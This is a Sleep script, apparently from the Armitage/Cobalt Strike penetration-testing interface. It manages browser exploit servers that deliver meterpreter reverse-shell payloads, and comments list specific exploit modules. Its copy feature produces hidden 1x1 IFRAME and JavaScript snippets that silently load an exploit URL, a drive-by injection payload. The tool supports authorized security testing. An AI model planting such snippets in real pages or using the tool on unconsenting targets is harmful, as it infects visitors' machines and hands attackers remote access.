#
# Manage client-side attacks
#

import ui.*;

import javax.swing.*;
import javax.swing.event.*;

import java.awt.*;
import java.awt.event.*;

import java.net.*;
import cloudstrike.*;

# %(Name => 'Exploit: windows/browser/ms11_003_ie_css_import', Port => 12805, Start => '2011-12-28 10:49:55 -0500', Payload => 'windows/meterpreter/reverse_tcp', Id => 2, URL => '/ownie')
# %(Name => 'Exploit: multi/browser/java_rhino', Port => '20219', Start => '2011-12-28 10:49:42 -0500', Payload => 'java/meterpreter/reverse_tcp', Id => 1, URL => '/')
# %(Name => 'Exploit: multi/handler', Port => 12805, Start => '2011-12-28 10:19:47 -0500', Payload => 'windows/meterpreter/reverse_tcp', Id => 0)

sub listClientSideAttacks {
	local('$job $data $url $port $proto @r $jid');
	foreach $job (jobs()) {
		$data = $job['Data'];
		if ('SRVPORT' in $data) {
			$url = $job['URL'];
			$port = $data['SRVPORT'];
			$jid  = $job['Id'];
			$proto = iff($data['SSL'] ne '0', 'https://', 'http://');
			push(@r, %(URL => "$proto $+ $MY_ADDRESS $+ : $+ $port $+ $url", Attack => $job['Name'], jid => $jid));
		}
	}
	return @r;
}

sub updateClientSideModel {
	local('$1');
	fork({
		local('$attack');
		[$model clear: 16];
		foreach $attack (listClientSideAttacks()) {
			[$model addEntry: $attack];
		}

		if ($other) {
			foreach $attack (call($mclient, "cloudstrike.list_sites")) {
				if ("*applet*" iswm $attack['Description'] || "*auto-ex*" iswm $attack['Description']) {
					[$model addEntry: %(Attack => "Cobalt Strike: " . $attack['Description'], URL => "http:// $+ $MY_ADDRESS $+ :" . $attack['Port'] . $attack['URI'] . '?id=%TOKEN%')];
				}
			}
		}

		[$model fireListeners];
	}, \$model, $other => $1, \$MY_ADDRESS, \$mclient, \$client);
}

# chooseClientSide({ callback });
sub chooseClientSide {
	local('$dialog $table $model $button');
	$dialog = dialog("Client-side Attacks", 640, 200);
	[$dialog setLayout: [new BorderLayout]];

	# create a table..
	($table, $model) = setupTable("URL", @('Attack', 'URL'), @());
	updateClientSideModel(\$model, 1);

	$button = [new JButton: "Choose"];
	[$button addActionListener: lambda({
		local('$item');
		$item = [$model getSelectedValue: $table];
		[$callback: $item];
		[$dialog setVisible: 0];
	}, \$model, \$table, \$dialog, $callback => $1)];

	# setup the dialog...
	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: center($button), [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
	[$dialog show];
}

sub manageClientSides {
	local('$dialog $table $model $url $iframe $xss $button $group $panel $south $kill $help $refresh');
	$dialog = dialog("Client-side Attacks", 640, 280);
	#$dialog = [new JPanel];
	[$dialog setLayout: [new BorderLayout]];

	# create a table..
	($table, $model) = setupTable("URL", @('Attack', 'URL'), @());
	updateClientSideModel(\$model);

	# create some radio buttons...
	$group = [new ButtonGroup];
	
	$url    = [new JRadioButton: "Only the URL"];
	$iframe = [new JRadioButton: "Create an IFRAME that contains the URL"];
	$xss    = [new JRadioButton: "Create JavaScript that loads the URL"];
	[$url setSelected: 1];

	[$group add: $url];
	[$group add: $iframe];
	[$group add: $xss];

	# layout the buttons...
	$panel = [new JPanel];
	[$panel setBorder: [BorderFactory createTitledBorder: "URL Format"]];
	[$panel setLayout: [new GridLayout: 3, 1]];
	[$panel add: $url];
	[$panel add: $iframe];
	[$panel add: $xss];

	$kill = [new JButton: "Kill"];
	[$kill addActionListener: lambda({
		[lambda({
			local('$jid');
			$jid = [$model getSelectedValueFromColumn: $table, "jid"];
			call_async_callback($client, "job.stop", $this, $jid);
			yield;
			updateClientSideModel(\$model);
		}, \$table, \$model)];
	}, \$table, \$model)];

	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({
		updateClientSideModel(\$model);
	}, \$table, \$model)];

	$button = [new JButton: "Copy"];
	[$button addActionListener: lambda({
		local('$item');
		$item = [$model getSelectedValue: $table];

		if (!isShift($1)) {
			[$dialog setVisible: 0];
		}

		if ([$url isSelected]) {
			[addToClipboard($item)];
		}
		else if ([$iframe isSelected]) {
			[addToClipboard('<IFRAME SRC="' . $item . '" WIDTH="1" HEIGHT="1"></IFRAME>')];
		}
		else if ([$xss isSelected]) {
			[addToClipboard('document.write("<IFRAME SRC=\\"' . $item . '\\" WIDTH=\\"1\\" HEIGHT=\\"1\\"></IFRAME>");')];
		}
	}, \$xss, \$iframe, \$url, \$model, \$table, \$dialog)];

	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-client-side-attack")];

	# 
	$south = [new JPanel];
	[$south setLayout: [new BorderLayout]];
	[$south add: $panel, [BorderLayout NORTH]];
	[$south add: center($button, $refresh, $kill, $help), [BorderLayout SOUTH]];

	# setup the dialog...
	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];
	[$dialog add: $south, [BorderLayout SOUTH]];

	[$dialog show];
	#[$frame addTab: "Client-sides", $dialog, $null]; 
}
